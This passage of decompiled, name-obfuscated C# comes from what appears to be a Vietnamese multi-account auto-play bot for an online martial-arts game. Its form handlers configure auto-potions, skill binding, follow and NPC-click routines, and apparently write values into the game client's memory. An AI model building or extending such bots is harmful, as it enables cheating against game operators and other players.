		if (num >= 0)
		{
			characterAccountConfig_1[num].bool_15 = false;
			characterAccountConfig_1[num].bool_55 = false;
		}
	}

	private void buttonVaotraiStopAll_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				characterAccountConfig_1[i].bool_15 = false;
				characterAccountConfig_1[i].bool_55 = false;
			}
		}
	}

	private void buttonThongke_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_3(characterAccountConfig_1, Class81.characterAccountConfig_0.int_136);
		if (num < 0)
		{
			num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num < 0)
			{
				FormTip.smethod_0(string_49, "Chọn 1 ac rồi bấm nút Thống kê.", 600000, 200, 120);
				return;
			}
		}
		if (characterAccountConfig_1[num].uint_17 == 0)
		{
			characterAccountConfig_1[num].uint_18 = 0u;
			characterAccountConfig_1[num].uint_17 = Class24.smethod_1(characterAccountConfig_1[num].int_137);
			if (characterAccountConfig_1[num].uint_17 == 0)
			{
				return;
			}
			Class75.smethod_8(ref characterAccountConfig_1[num]);
		}
		Class49 @class = new Class49();
		@class.characterAccountConfig_0 = characterAccountConfig_1[num];
		@class.string_0 = null;
		new Thread(@class.method_2).Start();
	}

	private void buttonApDungMuaThuocAll_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		if (characterAccountConfig_1[num].int_75 == null)
		{
			characterAccountConfig_1[num].int_75 = new int[5];
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (i != num)
			{
				int num2 = characterAccountConfig_1[num].int_71.Length;
				characterAccountConfig_1[i].int_71 = new int[num2];
				for (int j = 0; j < num2; j++)
				{
					characterAccountConfig_1[i].int_71[j] = characterAccountConfig_1[num].int_71[j];
				}
				int num3 = characterAccountConfig_1[num].int_72.Length;
				characterAccountConfig_1[i].int_72 = new int[num3];
				for (int k = 0; k < num3; k++)
				{
					characterAccountConfig_1[i].int_72[k] = characterAccountConfig_1[num].int_72[k];
				}
				int num4 = characterAccountConfig_1[num].int_73.Length;
				for (int l = 0; l < num4; l++)
				{
					characterAccountConfig_1[i].int_73[l] = characterAccountConfig_1[num].int_73[l];
				}
				characterAccountConfig_1[i].string_11 = characterAccountConfig_1[num].string_11;
				characterAccountConfig_1[i].string_12 = characterAccountConfig_1[num].string_12;
				characterAccountConfig_1[i].string_13 = characterAccountConfig_1[num].string_13;
				characterAccountConfig_1[i].int_105 = characterAccountConfig_1[num].int_105;
				characterAccountConfig_1[i].int_66 = characterAccountConfig_1[num].int_66;
				characterAccountConfig_1[i].int_77 = characterAccountConfig_1[num].int_77;
				characterAccountConfig_1[i].int_75 = new int[characterAccountConfig_1[num].int_75.Length];
				for (int m = 0; m < characterAccountConfig_1[num].int_75.Length; m++)
				{
					characterAccountConfig_1[i].int_75[m] = characterAccountConfig_1[num].int_75[m];
				}
				for (int n = 0; n < characterAccountConfig_1[num].int_76.Length; n++)
				{
					characterAccountConfig_1[i].int_76[n] = characterAccountConfig_1[num].int_76[n];
				}
				characterAccountConfig_1[i].string_14 = characterAccountConfig_1[num].string_14;
				characterAccountConfig_1[i].int_78 = characterAccountConfig_1[num].int_78;
				Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_23, 1, 4);
				Class56.smethod_13(characterAccountConfig_1[i]);
			}
		}
	}

	private void buttonAppDungBomMauAll_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (i != num)
			{
				for (int j = 0; j < characterAccountConfig_1[num].int_109.Length; j++)
				{
					characterAccountConfig_1[i].int_109[j] = characterAccountConfig_1[num].int_109[j];
				}
				for (int k = 0; k < characterAccountConfig_1[num].int_110.Length; k++)
				{
					characterAccountConfig_1[i].int_110[k] = characterAccountConfig_1[num].int_110[k];
				}
				for (int l = 0; l < characterAccountConfig_1[num].int_111.Length; l++)
				{
					characterAccountConfig_1[i].int_111[l] = characterAccountConfig_1[num].int_111[l];
				}
				for (int m = 0; m < characterAccountConfig_1[num].int_112.Length; m++)
				{
					characterAccountConfig_1[i].int_112[m] = characterAccountConfig_1[num].int_112[m];
				}
				for (int n = 0; n < characterAccountConfig_1[num].int_106.Length; n++)
				{
					characterAccountConfig_1[i].int_106[n] = characterAccountConfig_1[num].int_106[n];
				}
				for (int num2 = 0; num2 < characterAccountConfig_1[num].int_107.Length; num2++)
				{
					characterAccountConfig_1[i].int_107[num2] = characterAccountConfig_1[num].int_107[num2];
				}
				for (int num3 = 0; num3 < characterAccountConfig_1[num].int_113.Length; num3++)
				{
					characterAccountConfig_1[i].int_113[num3] = characterAccountConfig_1[num].int_113[num3];
				}
				for (int num4 = 0; num4 < characterAccountConfig_1[num].int_114.Length; num4++)
				{
					characterAccountConfig_1[i].int_114[num4] = characterAccountConfig_1[num].int_114[num4];
				}
				for (int num5 = 0; num5 < characterAccountConfig_1[num].int_104.Length; num5++)
				{
					characterAccountConfig_1[i].int_104[num5] = characterAccountConfig_1[num].int_104[num5];
				}
				characterAccountConfig_1[i].int_108 = characterAccountConfig_1[num].int_108;
				characterAccountConfig_1[i].string_16 = characterAccountConfig_1[num].string_16;
				characterAccountConfig_1[i].string_17 = characterAccountConfig_1[num].string_17;
				characterAccountConfig_1[i].int_115 = characterAccountConfig_1[num].int_115;
				characterAccountConfig_1[i].int_116 = characterAccountConfig_1[num].int_116;
				characterAccountConfig_1[i].int_117 = characterAccountConfig_1[num].int_117;
				characterAccountConfig_1[i].int_118 = characterAccountConfig_1[num].int_118;
				characterAccountConfig_1[i].int_58 = characterAccountConfig_1[num].int_58;
				Class56.smethod_13(characterAccountConfig_1[i]);
			}
		}
	}

	private void checkBoxTuGiaidoc_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_74[0] = Convert.ToByte(checkBoxTuGiaidoc.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxTimerBomMagic_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxTimerBomMagic.Text);
			if (num2 < 1000 || num2 > 15000)
			{
				num2 = 1000;
			}
			characterAccountConfig_1[num].int_74[1] = num2;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void textBoxSoluongBomMagic_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxSoluongBomMagic.Text);
			if (num2 < 1 || num2 > 60)
			{
				num2 = 1;
			}
			characterAccountConfig_1[num].int_74[2] = num2;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxMuaGiaiDoc_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_73[0] = Convert.ToByte(checkBoxMuaGiaiDoc.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void textBoxSoluongMuaGiaiDoc_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_73[2] = Class11.smethod_11(textBoxSoluongMuaGiaiDoc.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void comboBoxMuaGiaiDoc_MouseDown(object sender, MouseEventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			method_14(comboBoxMuaGiaiDoc);
		}
	}

	private void comboBoxMuaGiaiDoc_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_23 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxMuaGiaiDoc.Text;
		for (int i = 0; i < string_23.Length; i++)
		{
			if (text == Class1.smethod_1(string_23[i], 1))
			{
				characterAccountConfig_1[num].string_13 = string_23[i];
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
				break;
			}
		}
	}

	private void checkBoxMuaKTC_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_77 = Convert.ToByte(checkBoxMuaKTC.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
				Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_23, 1, 4);
			}
		}
	}

	private void comboBoxIndex_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = -1;
		string text = comboBoxIndex.Text;
		for (int i = 0; i < string_16.Length; i++)
		{
			if (text == string_16[i])
			{
				num = i;
				break;
			}
		}
		if (int_24 == num)
		{
			return;
		}
		checkBoxTatmuaAll.Checked = false;
		bool_18 = false;
		int_24 = num;
		if (int_24 == 0)
		{
			if (toadotk.Checked)
			{
				toadotk.Checked = false;
			}
			if (checkBoxFixtoadolag.Checked)
			{
				checkBoxFixtoadolag.Checked = false;
			}
		}
		checkBoxChienLongdong.Enabled = num == 0;
		checkBoxTubaoDanh.Enabled = int_24 == 1;
		Class66.smethod_11(Class66.smethod_1(), "IndexPK", int_24, "", 0);
		string text2 = null;
		if (int_24 == 0)
		{
			text2 = "Chế độ WAR dùng để đánh ở thành thị, sơn động, map train...";
		}
		else if (int_24 == 1)
		{
			text2 = "Chế độ TK dùng để đánh Tống Kim và Phong Hỏa liên thành.";
		}
		else if (int_24 != 2)
		{
			if (int_24 == 3)
			{
				text2 = "Chế độ ĐƠN ĐẤU: tối ưu tốc độ đánh (chỉ có đánh và bơm máu), thường dùng trong liên đấu. Chế độ này auto không tự mua máu, không tìm ac...";
			}
		}
		else
		{
			text2 = "Chế độ CTC dùng để đánh Chiến trường Công thành chiến (thất thành và tam trụ)";
		}
		if (text2 != null)
		{
			Class11.string_17 = new string[1] { text2 };
		}
	}

	private void checkBoxGiamRamTudong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_70 = Convert.ToByte(checkBoxGiamRamTudong.Checked);
			TryNewVersion.bool_1 = int_70 > 0;
			Class66.smethod_11(Class66.smethod_1(), "flagGiamRamtudong", int_70, "", 0);
			new Thread(TryNewVersion.smethod_4).Start();
		}
	}

	private void comboBoxGameOfWeb_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = int_4;
		string text = comboBoxGameOfWeb.Text;
		for (int i = 0; i < string_7.GetLength(0); i++)
		{
			if (text == string_7[i, 0] && int_4 != i)
			{
				int_4 = i;
				int_141 = -1;
				break;
			}
		}
		if (num == int_4)
		{
			return;
		}
		int_71 = 0;
		checkBoxMuaMauFree.Checked = false;
		checkBoxDoiTitle.Checked = false;
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int j = 0; j < characterAccountConfig_1.Length; j++)
		{
			if (characterAccountConfig_1[j].int_78 > 0)
			{
				characterAccountConfig_1[j].int_78 = 0;
				Class56.smethod_13(characterAccountConfig_1[j]);
			}
		}
	}

	private void method_18(bool bool_35 = false)
	{
		int num = -1;
		for (int i = 0; i < string_7.GetLength(0); i++)
		{
			if (string_6 == string_7[i, 0])
			{
				num = i;
				break;
			}
		}
		if (num >= 0)
		{
			Class20.int_1 = -1;
			Class37.int_1 = Class11.smethod_11(string_7[num, 2]);
			Class37.smethod_107();
			string text = string_7[num, 3];
			if (text != null && !(text == string.Empty))
			{
				if (!bool_35 || string_37 == null || string_37 == string.Empty)
				{
					string_37 = text;
					textBox4.Text = string_37;
				}
				string text2 = string_7[num, 5];
				if (text2 == "0" || text2 == "1")
				{
					int num2 = Class11.smethod_11(text2);
					bool_23 = false;
					checkBoxTHPCTC.Checked = num2 > 0;
					Thread.Sleep(60);
					int_112 = num2;
					Class66.smethod_11(Class66.smethod_1(), "flagTHPCTC", int_112, "", 0);
					bool_23 = true;
				}
			}
			else
			{
				int_112 = 0;
				checkBoxTHPCTC.Checked = false;
			}
		}
		else
		{
			method_2("Không thể cập nhật thần hành phù.");
		}
	}

	private void checkBoxGanChieuTrai_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			characterAccountConfig_1[num].int_138[0] = Convert.ToByte(checkBoxGanChieuTrai.Checked);
			Class56.smethod_13(characterAccountConfig_1[num]);
			if (characterAccountConfig_1[num].int_138[0] > 0 && characterAccountConfig_1[num].int_138[1] > 0)
			{
				Class83.smethod_15(characterAccountConfig_1[num], (uint)characterAccountConfig_1[num].int_138[1]);
				Class75.smethod_31(characterAccountConfig_1[num], (uint)characterAccountConfig_1[num].int_138[1]);
			}
		}
	}

	private void checkBoxGanChieuPhai_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			characterAccountConfig_1[num].int_139[0] = Convert.ToByte(checkBoxGanChieuPhai.Checked);
			Class56.smethod_13(characterAccountConfig_1[num]);
			if (characterAccountConfig_1[num].int_139[0] > 0 && characterAccountConfig_1[num].int_139[1] > 0)
			{
				Class83.smethod_15(characterAccountConfig_1[num], (uint)characterAccountConfig_1[num].int_139[1], bool_0: true);
				Class75.smethod_32(characterAccountConfig_1[num], (uint)characterAccountConfig_1[num].int_139[1]);
			}
		}
	}

	private void comboBoxGanChieuTrai_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxGanChieuTrai.Text;
		if (characterAccountConfig_1[num].gstruct58_0 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1[num].gstruct58_0.Length; i++)
		{
			if (text == characterAccountConfig_1[num].gstruct58_0[i].string_0)
			{
				characterAccountConfig_1[num].int_138[1] = characterAccountConfig_1[num].gstruct58_0[i].int_1;
				if (characterAccountConfig_1[num].int_138[0] > 0)
				{
					Class83.smethod_15(characterAccountConfig_1[num], (uint)characterAccountConfig_1[num].gstruct58_0[i].int_1);
					Class75.smethod_31(characterAccountConfig_1[num], (uint)characterAccountConfig_1[num].gstruct58_0[i].int_1);
					Class56.smethod_13(characterAccountConfig_1[num]);
				}
				break;
			}
		}
	}

	private void comboBoxGanChieuPhai_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxGanChieuPhai.Text;
		if (characterAccountConfig_1[num].gstruct58_0 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1[num].gstruct58_0.Length; i++)
		{
			if (text == characterAccountConfig_1[num].gstruct58_0[i].string_0)
			{
				characterAccountConfig_1[num].int_139[1] = characterAccountConfig_1[num].gstruct58_0[i].int_1;
				if (characterAccountConfig_1[num].int_139[0] > 0)
				{
					Class83.smethod_15(characterAccountConfig_1[num], (uint)characterAccountConfig_1[num].gstruct58_0[i].int_1, bool_0: true);
					Class75.smethod_32(characterAccountConfig_1[num], (uint)characterAccountConfig_1[num].gstruct58_0[i].int_1);
					Class56.smethod_13(characterAccountConfig_1[num]);
				}
				break;
			}
		}
	}

	private void checkBoxTrinhSat_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_96 = Convert.ToByte(checkBoxTrinhSat.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagRabangTrinhsat", int_96, "", 0);
		}
	}

	private void buttonGiaiThichHaucan_Click(object sender, EventArgs e)
	{
		string text = "- Ô bên trái là chỉ số % hoặc điểm.|- Ô bên phải là số lượng bình thuốc ăn một lần.|- Ô ở giữa là thời gian (mili giây) giữa 2 lần sử dụng thuốc.||Ví dụ mục Tự ăn giải độc, bạn ghi 4500 và 2. Thì khi dính độc, ac sẽ ăn 2 bình, sau đó chờ 4,5 giây (nếu còn dính độc) thì lại ăn tiếp 2 bình...||Mục <Gán thiết lập chung cho tất cả> là chỉ cần thiết lập cho 1 acc, rồi bấm nút này thì tất cả các ac còn lại sẽ có thiết lập giống y chang ac này.";
		FormTip.smethod_0("HAU CAN BOM THUOC", text, 999000, 370, 210, bool_8: false, Cursor.Position.X, Cursor.Position.Y - 210);
		string text2 = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
		if (!Class11.smethod_17(text2))
		{
			text2 = Class66.smethod_0();
		}
		Class24.smethod_40(text2, "", "https://www. ", 0);
	}

	private void checkBoxAnThuocLag_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_63 = Convert.ToByte(checkBoxAnThuocLag.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTheoSau_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		if (checkBoxTheoSau.Checked && AuxiliaryMachineManager.bool_3)
		{
			FormTip.smethod_0(string_49, Class11.smethod_0(Class11.char_11), 60000, 250, 100);
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			characterAccountConfig_1[num].int_68[0] = Convert.ToByte(checkBoxTheoSau.Checked && !AuxiliaryMachineManager.bool_3);
			labelTheoSauAll.Enabled = true;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void comboBoxTheoSau_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxTheoSau.Text;
		if (string_51 != null)
		{
			for (int i = 0; i < string_51.Length; i++)
			{
				if (Class1.smethod_1(string_51[i], 1) == text)
				{
					characterAccountConfig_1[num].string_9 = string_51[i];
					Class56.smethod_13(characterAccountConfig_1[num]);
					break;
				}
			}
		}
		labelTheoSauAll.Enabled = true;
	}

	private void textBoxKhoangCachTheoSau_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_68[1] = Class11.smethod_11(textBoxKhoangCachTheoSau.Text);
				labelTheoSauAll.Enabled = true;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void labelTheoSauAll_Click(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		if (!AuxiliaryMachineManager.bool_3)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num < 0)
			{
				return;
			}
			CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
			if (characterAccountConfig_1 != null)
			{
				for (int i = 0; i < characterAccountConfig_1.Length; i++)
				{
					if (i != num)
					{
						characterAccountConfig_1[i].int_68 = new int[3]
						{
							characterAccountConfig.int_68[0],
							characterAccountConfig.int_68[1],
							characterAccountConfig.int_68[2]
						};
						characterAccountConfig_1[i].string_9 = characterAccountConfig.string_9;
						Class56.smethod_13(characterAccountConfig_1[i]);
					}
				}
			}
			labelTheoSauAll.Enabled = false;
		}
		else
		{
			FormTip.smethod_0(string_49, Class11.smethod_0(Class11.char_11), 600000, 250, 80);
		}
	}

	private void comboBoxTheoSau_MouseDown(object sender, MouseEventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool_23 = false;
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		string text = characterAccountConfig.string_9;
		string text2 = null;
		comboBoxTheoSau.Items.Clear();
		string_51 = null;
		Class3.smethod_25(characterAccountConfig_1[num], ref string_51, 1);
		if (string_51 != null)
		{
			for (int i = 0; i < string_51.Length; i++)
			{
				if (string_51[i] == text)
				{
					text2 = text;
				}
				comboBoxTheoSau.Items.Add(Class1.smethod_1(string_51[i], 1));
			}
		}
		if (text2 == null && text != null && text != string.Empty)
		{
			comboBoxTheoSau.Items.Add(Class1.smethod_1(text, 1));
			text2 = text;
		}
		comboBoxTheoSau.Items.Add("");
		if (text2 != null && text2 != string.Empty)
		{
			comboBoxTheoSau.Text = Class1.smethod_1(text2, 1);
		}
		bool_23 = true;
	}

	private void checkBoxClickNPCmenu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_8 = Convert.ToByte(checkBoxClickNPCmenu.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	public static int[] smethod_2(string string_69)
	{
		if (!(string_69 == string.Empty) && string_69 != null)
		{
			string[] array = string_69.Split(',', '.', ':', '/', '|', '=', '-', '+', ';');
			int[] array2 = new int[array.Length];
			for (int i = 0; i < array2.Length; i++)
			{
				array2[i] = Class11.smethod_11(array[i]);
			}
			return array2;
		}
		return null;
	}

	private void checkBoxClickNPCSolan_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			if (characterAccountConfig_1[num].int_7 == null)
			{
				characterAccountConfig_1[num].int_7 = new int[2] { 0, 3 };
			}
			characterAccountConfig_1[num].int_7[0] = Convert.ToByte(checkBoxClickNPCSolan.Checked);
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void textBoxClickNPCSolan_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			if (characterAccountConfig_1[num].int_7 == null)
			{
				characterAccountConfig_1[num].int_7 = new int[2] { 0, 3 };
			}
			characterAccountConfig_1[num].int_7[1] = Class11.smethod_11(textBoxClickNPCSolan.Text);
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void textBoxClickNPCTocdo_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxClickNPCTocdo.Text);
			if (num2 < 0 || num2 > 15000)
			{
				num2 = 300;
			}
			characterAccountConfig_1[num].int_10 = num2;
			Class75.smethod_2(characterAccountConfig_1[num], Class75.uint_49, num2, 4);
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void comboBoxClickNPC_MouseDown(object sender, MouseEventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool_23 = false;
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		string text = characterAccountConfig.string_0;
		string text2 = null;
		comboBoxClickNPC.Items.Clear();
		string_52 = null;
		Class3.smethod_25(characterAccountConfig_1[num], ref string_52, 3);
		if (string_52 != null)
		{
			Array.Sort(string_52);
			for (int i = 0; i < string_52.Length; i++)
			{
				if (string_52[i] == text)
				{
					text2 = text;
				}
				comboBoxClickNPC.Items.Add(Class1.smethod_1(string_52[i], 1));
			}
		}
		if (text2 == null && text != string.Empty)
		{
			comboBoxClickNPC.Items.Add(Class1.smethod_1(text, 1));
			text2 = text;
		}
		comboBoxClickNPC.Items.Add("");
		if (text2 != null && text2 != string.Empty)
		{
			comboBoxClickNPC.Text = Class1.smethod_1(text2, 1);
		}
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxClickNPC_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		string text = comboBoxClickNPC.Text;
		if (string_52 != null)
		{
			for (int i = 0; i < string_52.Length; i++)
			{
				if (Class1.smethod_1(string_52[i], 1) == text)
				{
					string_53 = string_52[i];
					break;
				}
			}
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			characterAccountConfig_1[num].string_0 = string_53;
		}
	}

	private void buttonHuongdanHLP_Click(object sender, EventArgs e)
	{
	}

	private void method_19()
	{
		if (FormVideoHelp.bool_0)
		{
			FormVideoHelp.bool_0 = false;
			return;
		}
		try
		{
			FormVideoHelp formVideoHelp = new FormVideoHelp();
			formVideoHelp.int_0 = base.Left;
			formVideoHelp.int_1 = base.Top;
			formVideoHelp.int_2 = base.Width;
			formVideoHelp.int_3 = base.Height;
			formVideoHelp.Show();
		}
		catch
		{
		}
	}

	private void checkBoxGioClick_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct49_0.int_2 = Convert.ToByte(checkBoxGioClick.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void numericUpDownHH_ValueChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct49_0.int_3 = (int)numericUpDownHH.Value;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void numericUpDownMM_ValueChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct49_0.int_4 = (int)numericUpDownMM.Value;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void numericUpDownSS_ValueChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].gstruct49_0.int_5 = (int)numericUpDownSS.Value;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxChienTruong_SelectedIndexChanged(object sender, EventArgs e)
	{
		string text = comboBoxChienTruong.Text;
		for (int i = 0; i < Class6.cityTransportData_0.Length; i++)
		{
			if (Class6.cityTransportData_0[i].string_2 == text)
			{
				if (int_113 != i)
				{
					int_113 = i;
					Class66.smethod_11(Class66.smethod_1(), "IdexChientruongChinh", int_113, "", 0);
				}
				break;
			}
		}
	}

	private void comboBoxChienTruongMapPhu_SelectedIndexChanged(object sender, EventArgs e)
	{
		string text = comboBoxChienTruongMapPhu.Text;
		for (int i = 0; i < Class6.cityTransportData_0.Length; i++)
		{
			if (Class6.cityTransportData_0[i].string_2 == text)
			{
				if (int_115 != i)
				{
					int_115 = i;
					Class66.smethod_11(Class66.smethod_1(), "IdexChientruongPhu", int_115, "", 0);
				}
				break;
			}
		}
	}

	private void checkBoxTHPCTC_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_112 = Convert.ToByte(checkBoxTHPCTC.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagTHPCTC", int_112, "", 0);
		}
	}

	private void checkBoxMapPhu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_114 = Convert.ToByte(checkBoxMapPhu.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagSudungMapphuEx", int_114, "", 0);
		}
	}

	private void checkBoxAccChinhTudieukhienCTC_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_119 = Convert.ToByte(checkBoxAccChinhTudieukhienCTC.Checked);
			Class66.smethod_11(Class66.smethod_1(), "CTCAchinhTudieuKhien", int_119, "", 0);
		}
	}

	private void checkBoxChienLongdong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			Class20.int_1 = -1;
			int_121 = Convert.ToByte(checkBoxChienLongdong.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagDanhChienlongdong", int_121, "", 0);
		}
	}

	private void comboBoxCLD_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		string text = comboBoxCLD.Text;
